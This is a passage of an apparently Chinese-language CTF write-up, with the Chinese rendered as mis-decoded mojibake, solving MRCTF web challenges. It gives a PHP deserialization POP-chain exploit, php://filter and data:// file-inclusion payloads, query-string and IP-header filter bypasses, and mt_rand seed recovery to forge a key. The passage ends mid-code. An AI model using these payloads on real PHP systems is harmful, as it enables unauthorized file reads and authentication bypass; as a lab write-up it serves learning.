<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/30/MRCTF/5.png" src="/img/loading.gif" class="lazyload"></a>

<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/30/MRCTF/6.png" src="/img/loading.gif" class="lazyload"></a>

<p>æœ€åèšå‰‘è¿ä¸€ä¸‹ï¼Œå¾—åˆ°flag</p>
<h3 id="Ezpop"><a href="#Ezpop" class="headerlink" title="Ezpop"></a>Ezpop</h3><p>ç¬¬ä¸€æ¬¡é‡åˆ°ååºåˆ—åŒ–æ„é€ popé“¾çš„é¢˜ï¼Œè¿˜æ˜¯å…¥é—¨æ™šäº†å—·ï¼Œæ„é€ äº†å¥½ä¹…è¿˜æ˜¯ä¸ä¼šåˆ©ç”¨ç±»ä¹‹é—´çš„å…³ç³»ï¼Œçœ‹äº†wpæ‰æç„¶å¤§æ‚Ÿã€‚ã€‚</p>
<p><a href="https://segmentfault.com/a/1190000007250604" target="_blank" rel="noopener">ä¸€äº›å‡½æ•°</a></p>
<blockquote>
<ol>
<li>__construct()ï¼Œç±»çš„æ„é€ å‡½æ•°</li>
<li>__destruct()ï¼Œç±»çš„ææ„å‡½æ•°</li>
<li>__call()ï¼Œåœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨</li>
<li>__callStatic()ï¼Œç”¨é™æ€æ–¹å¼ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨</li>
<li>__get()ï¼Œè·å¾—ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨</li>
<li>__set()ï¼Œè®¾ç½®ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨</li>
<li>__isset()ï¼Œå½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨isset()æˆ–empty()æ—¶è°ƒç”¨</li>
<li>__unset()ï¼Œå½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨unset()æ—¶è¢«è°ƒç”¨ã€‚</li>
<li>__sleep()ï¼Œæ‰§è¡Œserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°</li>
<li>__wakeup()ï¼Œæ‰§è¡Œunserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°</li>
<li>__toString()ï¼Œç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶çš„å›åº”æ–¹æ³•</li>
<li>__invoke()ï¼Œè°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶çš„å›åº”æ–¹æ³•</li>
<li>__set_state()ï¼Œè°ƒç”¨var_export()å¯¼å‡ºç±»æ—¶ï¼Œæ­¤é™æ€æ–¹æ³•ä¼šè¢«è°ƒç”¨ã€‚</li>
<li>__clone()ï¼Œå½“å¯¹è±¡å¤åˆ¶å®Œæˆæ—¶è°ƒç”¨</li>
<li>__autoload()ï¼Œå°è¯•åŠ è½½æœªå®šä¹‰çš„ç±»</li>
<li>__debugInfo()ï¼Œæ‰“å°æ‰€éœ€è°ƒè¯•ä¿¡æ¯</li>
</ol>
</blockquote>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123; <span class="comment">//ç”¨å‡½æ•°è°ƒç”¨Modifieræ—¶è°ƒç”¨</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var); <span class="comment">//é€šè¿‡varå®ç°æ–‡ä»¶åŒ…å«</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file=<span class="string">'index.php'</span>)</span></span>&#123;<span class="comment">//æ„é€ å‡½æ•°</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Welcome to '</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;<span class="comment">//ç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶è°ƒç”¨</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;<span class="comment">//ææ„æ—¶è°ƒç”¨</span></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/gopher|http|file|ftp|https|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span>&#123; <span class="comment">//è·å–Testç±»çš„æˆå‘˜å˜é‡</span></span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function(); <span class="comment">//å°†å˜é‡Pä»¥å‡½æ•°æ‰§è¡Œ</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'pop'</span>]))&#123;</span><br><span class="line">    @unserialize($_GET[<span class="string">'pop'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>æ€è·¯ï¼šååºåˆ—åŒ–æ—¶è°ƒç”¨<code>__wakeup()</code>è¿›è¡Œå­—ç¬¦ä¸²æ¯”è¾ƒï¼Œå¦‚æœ<code>$this-&gt;source</code>æ˜¯<code>Show</code>ç±»ï¼Œåˆ™è°ƒç”¨<code>__toString()</code>ã€‚</p>
<p><code>return $this-&gt;str-&gt;source;</code>ä¼šè®¿é—®<code>str</code>çš„<code>source</code>å±æ€§ï¼Œè‹¥<code>str</code>æ˜¯<code>Test</code>ç±»åˆ™ä¸å­˜åœ¨<code>source</code>å±æ€§ï¼Œä¾¿è°ƒç”¨äº†<code>__get()</code>ã€‚</p>
<p><code>__get</code>å°†<code>p</code>ä»¥å‡½æ•°æ‰§è¡Œï¼Œå¯ä»¥å°†<code>p</code>å®ä¾‹åŒ–ä¸º<code>Modify</code>ç±»ï¼Œå°±è°ƒç”¨äº†<code>Modifier</code>çš„<code>__invoke()</code>æ–¹æ³•ã€‚</p>
<p>æœ€åé€šè¿‡<code>var</code>æ¥æ„é€ ä¼ªåè®®æ¥è¯»æºç ã€‚</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var=<span class="string">"php://filter/convert.base64-encode/resource=flag.php"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">new</span> Modifier();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> Show(<span class="string">'abc'</span>);<span class="comment">//åˆå§‹åŒ–ä¸€ä¸ªShowç±»</span></span><br><span class="line">$a-&gt;str=<span class="keyword">new</span> Test();<span class="comment">//å°†strå®ä¾‹åŒ–ä¸ºTestç±»ï¼Œè®¿é—®Testç±»sourceå˜é‡æ—¶è°ƒç”¨__get()</span></span><br><span class="line">$b=<span class="keyword">new</span> Show($a);<span class="comment">//ä»¤$this-&gt;sourceç­‰äºShowç±»ï¼Œç±»$aè¢«å½“æˆå­—ç¬¦ä¸²çš„å½¢å¼æ‰§è¡Œï¼Œä»è€Œè°ƒç”¨__toString()</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($b));</span><br></pre></td></tr></table></figure></div>

<p>base64è§£ç åå¾—åˆ°flag</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/03/30/MRCTF/7.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="å¥—å¨ƒ"><a href="#å¥—å¨ƒ" class="headerlink" title="å¥—å¨ƒ"></a>å¥—å¨ƒ</h3><p>ç®€å•Bypassã€ä¼ªåè®®ã€jsfuck</p>
<p>F12å‘ç°ä»¥ä¸‹æºç </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="comment">//1st</span></span><br><span class="line">$query = $_SERVER[<span class="string">'QUERY_STRING'</span>];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>( substr_count($query, <span class="string">'_'</span>) !== <span class="number">0</span> || substr_count($query, <span class="string">'%5f'</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Y0u are So cutE!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">if</span>($_GET[<span class="string">'b_u_p_t'</span>] !== <span class="string">'23333'</span> &amp;&amp; preg_match(<span class="string">'/^23333$/'</span>, $_GET[<span class="string">'b_u_p_t'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are going to the next ~"</span>;</span><br><span class="line">&#125;</span><br><span class="line">!--&gt;</span><br></pre></td></tr></table></figure></div>

<p>ç¬¬ä¸€ä¸ªéªŒè¯æŠŠ<code>_</code>å’Œ<code>%5f</code> banäº†ï¼Œå¯ä»¥ç”¨<code>ç©ºæ ¼</code>å’Œ <code>.</code>æ¥ä»£æ›¿ï¼Œç¬¬äºŒä¸ªå¯ä»¥ç”¨æ¢è¡Œæ±¡æŸ“<code>%0a</code>æ¥ç»•è¿‡ã€‚å¾—åˆ°æç¤ºï¼š<code>FLAG is in secrettw.php</code>ã€‚</p>
<p>æ‰“å¼€<code>secrettw.php</code>å¾—åˆ°<code>But how to get it?Local access only!</code></p>
<p>æºç ä¸­æœ‰jsfuckï¼Œè§£ç å¾—åˆ°ï¼š<code>post me Merak</code></p>
<p>postä¸€ä¸ªMerakå‚æ•°ï¼Œæ„é€ <code>Client-ip:127.0.0.1</code>ï¼Œå¾—åˆ°phpä»£ç </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">error_reporting(<span class="number">0</span>);  </span><br><span class="line"><span class="keyword">include</span> <span class="string">'takeip.php'</span>; </span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'.'</span>);  </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'Merak'</span>]))&#123;  </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);  </span><br><span class="line">    <span class="keyword">die</span>();  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span><span class="params">($v)</span></span>&#123;  </span><br><span class="line">    $v = base64_decode($v);  </span><br><span class="line">    $re = <span class="string">''</span>;  </span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123;  </span><br><span class="line">        $re .= chr ( ord ($v[$i]) + $i*<span class="number">2</span> );  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> $re;  </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Local access only!'</span>.<span class="string">"&lt;br/&gt;"</span>; </span><br><span class="line">$ip = getIp(); </span><br><span class="line"><span class="keyword">if</span>($ip!=<span class="string">'127.0.0.1'</span>) </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Sorry,you don't have permission!  Your ip is :"</span>.$ip; </span><br><span class="line"><span class="keyword">if</span>($ip === <span class="string">'127.0.0.1'</span> &amp;&amp; file_get_contents($_GET[<span class="string">'2333'</span>]) === <span class="string">'todat is a happy day'</span> )&#123; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Your REQUEST is:"</span>.change($_GET[<span class="string">'file'</span>]); </span><br><span class="line"><span class="keyword">echo</span> file_get_contents(change($_GET[<span class="string">'file'</span>])); &#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>è¦æ±‚ä¼ å…¥<code>2333</code>å˜é‡æ–‡ä»¶çš„å†…å®¹ä¸º<code>todat is a happy day</code></p>
<p>å¯ä»¥ç”¨<code>php://input</code>æˆ–è€…<code>data://</code>ä¼ªåè®®ç»•è¿‡ï¼Œ<code>data://text/plain,todat is a happy day</code>ã€‚</p>
<p>ä¸”ä¼ å…¥çš„<code>file</code>å˜é‡è¦ç»è¿‡<code>change</code>åŠ å¯†ï¼Œæ‰€ä»¥ä¼ å…¥ä¸€ä¸ªåŠ å¯†çš„ä¼ªåè®®æˆ–è€…æ–‡ä»¶åè¿›è¡Œæ–‡ä»¶åŒ…å«ã€‚</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rechange</span><span class="params">($v)</span></span>&#123;</span><br><span class="line">    $re = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123;</span><br><span class="line">        $re .= chr ( ord ($v[$i]) - $i*<span class="number">2</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    $rc=base64_encode($re);</span><br><span class="line">    <span class="keyword">return</span> $rc;</span><br><span class="line">&#125;</span><br><span class="line">$v=<span class="string">"php://filter/read=convert.base64-encode/resource=flag.php"</span>;<span class="comment">//å¾—åˆ°ç»“æœè¿›è¡Œbase64è§£ç å¾—åˆ°flag</span></span><br><span class="line"><span class="comment">//æˆ–è€…$v="flag.php";ç„¶åæŸ¥çœ‹æºç å¾—åˆ°flag</span></span><br><span class="line">$a=rechange($v);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br></pre></td></tr></table></figure></div>

<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/30/MRCTF/8.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="Ezaudit"><a href="#Ezaudit" class="headerlink" title="Ezaudit"></a>Ezaudit</h3><p>æºç æ³„éœ²ã€ä¼ªéšæœºæ•°ã€åŸºç¡€SQL</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/30/MRCTF/9.png" src="/img/loading.gif" class="lazyload"></a>

<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">'Content-type:text/html; charset=utf-8'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'login'</span>]))&#123;</span><br><span class="line">    $username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">    $password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">    $Private_key = $_POST[<span class="string">'Private_key'</span>];</span><br><span class="line">    <span class="keyword">if</span> (($username == <span class="string">''</span>) || ($password == <span class="string">''</span>) ||($Private_key == <span class="string">''</span>)) &#123;</span><br><span class="line">        <span class="comment">// è‹¥ä¸ºç©º,è§†ä¸ºæœªå¡«å†™,æç¤ºé”™è¯¯,å¹¶3ç§’åè¿”å›ç™»å½•ç•Œé¢</span></span><br><span class="line">        header(<span class="string">'refresh:2; url=login.html'</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"ç”¨æˆ·åã€å¯†ç ã€å¯†é’¥ä¸èƒ½ä¸ºç©ºå•¦,crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>($Private_key != <span class="string">'*************'</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        header(<span class="string">'refresh:2; url=login.html'</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"å‡å¯†é’¥ï¼Œå’‹ä¼šè®©ä½ ç™»å½•?crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($Private_key === <span class="string">'************'</span>)&#123;</span><br><span class="line">        $getuser = <span class="string">"SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'"</span>.<span class="string">';'</span>; </span><br><span class="line">        $link=mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">        mysql_select_db(<span class="string">"test"</span>,$link);</span><br><span class="line">        $result = mysql_query($getuser);</span><br><span class="line">        <span class="keyword">while</span>($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;&lt;td&gt;"</span>.$row[<span class="string">"username"</span>].<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>.$row[<span class="string">"flag"</span>].<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// genarate public_key </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span><span class="params">($length = <span class="number">16</span>)</span> </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $public_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//genarate private_key</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">private_key</span><span class="params">($length = <span class="number">12</span>)</span> </span>&#123;</span><br><span class="line">    $strings2 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $private_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">  &#125;</span><br><span class="line">  $Public_key = public_key();</span><br><span class="line">  <span class="comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr's private_key???</span></span><br></pre></td></tr></table></figure></div>

<p>è¦æ±‚<code>$Private_key</code>ï¼Œå·²çŸ¥<code>$Public_key = KVQP0LdJKRaV3n9D</code>ï¼Œå¹¶ä¸”å®ƒä»¬éƒ½æ˜¯<code>mt_rand()</code>ç”Ÿæˆçš„ï¼Œæ‰€ä»¥ç”¨å…¬é’¥å»è¿˜åŸç§å­ï¼Œç”¨ç§å­æ±‚å‡ºç§é’¥å³å¯ã€‚</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *str1 = <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"</span>;<span class="comment">//å­—æ¯è¡¨</span></span><br><span class="line">    <span class="keyword">char</span> *str2 = <span class="string">"KVQP0LdJKRaV3n9D"</span>; <span class="comment">//å…¬é’¥</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(str2) ; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="built_in">strlen</span>(str1) ; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> ( str2[i] == str1[j] ) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"%d %d 0 %d "</span>, j, j, <span class="built_in">strlen</span>(str1)<span class="number">-1</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>æˆ–è€…</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str1 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ012345678'</span></span><br><span class="line">str2 = <span class="string">'KVQP0LdJKRaV3n9D'</span></span><br><span class="line">str3 = str1[::<span class="number">-1</span>]</span><br><span class="line">length = len(str2)</span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str2)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(str1)):</span><br><span class="line">        <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">            res += str(j) + <span class="string">' '</span> + str(j) + <span class="string">' '</span> + <span class="string">'0'</span> + <span class="string">' '</span> + str(len(str1) - <span class="number">1</span>) + <span class="string">' '</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure></div>

<p>å¾—åˆ°ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61</span><br></pre></td></tr></table></figure></div>

<p>æŠŠä¸Šé¢çš„ä¸€ä¸²æ•°å­—ä¸¢è¿›<a href="https://www.openwall.com/php_mt_seed/" target="_blank" rel="noopener">php_mt_rand</a>çˆ†ç ´ä¸€ä¸‹ï¼Œå¾—åˆ°ç§å­ï¼š<code>1775196155</code>ï¼ˆæ³¨æ„phpç‰ˆæœ¬ï¼Œ5å’Œ7åŒæ ·ç§å­ï¼Œç”Ÿæˆä¸åŒ</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/30/MRCTF/10.png" src="/img/loading.gif" class="lazyload"></a>

<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/30/MRCTF/11.png" src="/img/loading.gif" class="lazyload"></a>

<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">1775196155</span>);</span><br><span class="line"><span class="comment">// genarate public_key</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span><span class="params">($length = <span class="number">16</span>)</span> </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $public_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">        $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//genarate private_key</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">private_key</span><span class="params">($length = 